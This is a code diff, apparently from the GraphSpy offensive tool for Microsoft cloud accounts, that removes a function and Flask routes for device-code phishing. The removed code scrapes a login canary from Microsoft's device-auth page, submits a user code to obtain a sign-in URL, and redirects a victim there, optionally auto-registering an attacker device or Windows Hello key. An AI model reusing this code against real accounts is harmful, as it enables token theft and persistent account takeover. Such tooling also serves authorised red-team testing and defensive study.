@@ -483,31 +483,6 @@ def device_code_flow(version= 1, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab0
     start_device_code_thread()
     return user_code
 
-def get_device_code_reprocess_url(user_code):
-    session = requests.Session()
-    url = "https://login.microsoftonline.com/common/oauth2/deviceauth"
-    headers = {"User-Agent":get_user_agent()}
-    response1 = session.get(url, headers=headers)
-    hpgrequestid = response1.headers["x-ms-request-id"]
-    canary = re.search(r'","canary":"(.*?)","sCanaryTokenName"', response1.text)
-    if not canary:
-        gspy_log.error(f"Failed to extract canary from response.")
-        return create_response("400", "Failed to extract canary from response")
-    body = {
-        "otc": user_code,
-        "canary": canary.group(1),
-        "flowToken": "",
-        "hpgrequestid": hpgrequestid
-    }
-    url2 = "https://login.microsoftonline.com/common/oauth2/deviceauth?sso_reload=true"
-    response2 = session.post(url2, data=body, headers=headers)
-    reprocess_url = re.search(r'"urlLogin":"(.*?)"', response2.text)
-
-    if not reprocess_url:
-        gspy_log.error("Failed to obtain reprocess URL.")
-        return create_response("400", "Failed to obtain reprocess URL.")
-    return reprocess_url.group(1)
-
 # ========== PRT Functions ==========
 
 def generate_key_pair():
@@ -1641,35 +1616,6 @@ def init_routes():
         else:
             user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae)
         return user_code
-
-    @app.post('/api/generate_device_code_reprocess_url')
-    def api_generate_device_code_reprocess_url():
-        if not "user_code" in request.form:
-            return create_response("400", "No user_code specified.")
-        user_code = request.form['user_code']
-        return get_device_code_reprocess_url(user_code)
-
-    @app.route('/api/generate_device_code_and_redirect')
-    def api_generate_device_code_and_redirect():
-        version = int(request.args.get('version','1')) if request.args.get('version','1').isdigit() else 1
-        client_id = request.args.get('client_id') or "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-        resource = request.args.get('resource') or "https://graph.microsoft.com"
-        scope = request.args.get('scope') or "https://graph.microsoft.com/.default openid offline_access"
-        ngcmfa = request.args.get('ngcmfa') == "true"
-        cae = request.args.get('cae') == "true"
-        # Supported auto_action: [device_pt, winhello]
-        auto_action = request.args.get('auto_action')
-        if auto_action and auto_action != "none":
-            auto_device_name = request.args.get('auto_device_name') or "GraphSpy-Device"
-            auto_join_type = int(request.args.get('auto_join_type')) if request.args.get('auto_join_type') else 0
-            auto_device_type = request.args.get('auto_device_type') or "Windows"
-            auto_os_version = request.args.get('auto_os_version') or "10.0.26100"
-            auto_target_domain = request.args.get('auto_target_domain') or "e-corp.local"
-            user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae,auto_action,auto_device_name,auto_join_type,auto_device_type,auto_os_version,auto_target_domain)
-        else:
-            user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae)
-        reprocess_url = get_device_code_reprocess_url(user_code)
-        return redirect(reprocess_url)
 
     @app.route("/api/delete_device_code/<id>")
     def api_delete_device_code(id):
